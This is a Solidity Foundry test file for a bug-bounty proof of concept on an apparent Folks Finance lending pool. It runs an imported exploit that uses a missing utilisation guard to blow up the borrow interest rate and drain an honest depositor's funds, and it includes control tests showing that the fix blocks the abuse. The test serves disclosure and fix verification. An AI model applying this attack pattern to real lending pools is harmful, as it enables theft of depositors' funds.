// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    HubPool,
    HubPoolFixed,
    MiniToken,
    MathUtils,
    Math
} from "./61019-infinite-interest-rate-bug-immunefi-folks-finance-git.sol";

contract InfiniteInterestRateTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant HONEST = 0x000000000000000000000000000000000000600d;

    uint256 internal constant HONEST_DEPOSIT = 50_000;
    uint256 internal constant ATTACKER_DEPOSIT = 50_000;
    uint256 internal constant BORROW_AMOUNT = 1e18;

    function test_exploit_infiniteInterestRate_drainsPool() public {
        Exploit e = new Exploit();
        e.run();

        MiniToken token = MiniToken(e.underlyingAddr());

        // 1) The missing utilisation guard made the variable borrow rate explode
        //    to ~4e31 (trillions of %/sec) — far above 1e31.
        assertGt(e.buggyVarRate(), 1e31, "variable borrow rate did not explode");

        // 2) After one block of accrual the attacker's 50_000-wei dust deposit is
        //    redeemable for far more underlying than the pool's entire real base.
        assertGt(e.attackerClaim(), e.realAssetBase(), "no over-mint of deposit value");
        assertGt(e.attackerClaim(), 1e23, "over-mint magnitude too small");
        assertEq(e.realAssetBase(), HONEST_DEPOSIT + ATTACKER_DEPOSIT, "real asset base is only the 1e5 deposits");

        // 3) The attacker drained the entire pool: honest depositor can recover NOTHING.
        assertEq(e.honestRecoverable(), 0, "pool not fully drained");

        // 4) Concrete theft: the attacker took the honest depositor's 50_000 wei
        //    on top of their own principal, delivered to the attacker EOA.
        assertEq(e.stolenToAttacker(), HONEST_DEPOSIT, "stolen amount != honest deposit");
        assertEq(token.balanceOf(ATTACKER), HONEST_DEPOSIT, "stolen underlying not at attacker EOA");
    }

    /// @notice Negative control — the fix (PR #225 guard) reverts the very borrow
    ///         that creates totalDebt > totalDeposits, so utilisation can never
    ///         exceed 1e18, the rate never explodes, and no over-mint is possible.
    function test_control_fixedGuard_blocksUtilisationOverflow() public {
        MiniToken token = new MiniToken("Folks Pool Token", "TKN");
        HubPoolFixed pool = new HubPoolFixed(address(token));

        // Same fresh-pool state: two dust deposits => totalDeposits = 1e5.
        token.mint(address(pool), HONEST_DEPOSIT);
        pool.creditDeposit(HONEST, HONEST_DEPOSIT);
        token.mint(address(pool), ATTACKER_DEPOSIT);
        pool.creditDeposit(address(this), ATTACKER_DEPOSIT);

        // Driving totalDebt (1e18) above totalDeposits (1e5) now reverts.
        vm.expectRevert(MathUtils.RatioExceedsOne.selector);
        pool.updateWithBorrow(BORROW_AMOUNT, false);
    }

    /// @notice Sanity: with the fix, a legitimate borrow within deposits keeps the
    ///         rate bounded (no explosion) — proving the guard only blocks the abuse.
    function test_control_fixedGuard_allowsLegitimateBorrow() public {
        MiniToken token = new MiniToken("Folks Pool Token", "TKN");
        HubPoolFixed pool = new HubPoolFixed(address(token));

        // A real pool with 1e18 deposits, borrowing a sane fraction (2e17).
        token.mint(address(pool), 1e18);
        pool.creditDeposit(address(this), 1e18);
        pool.updateWithBorrow(2e17, false); // utilisation 20% — well under 100%

        // Rate stays tiny (well below the 1e31 explosion threshold).
        assertLt(pool.getVariableBorrowInterestRate(), 1e18, "legit borrow must keep rate bounded");
    }
}
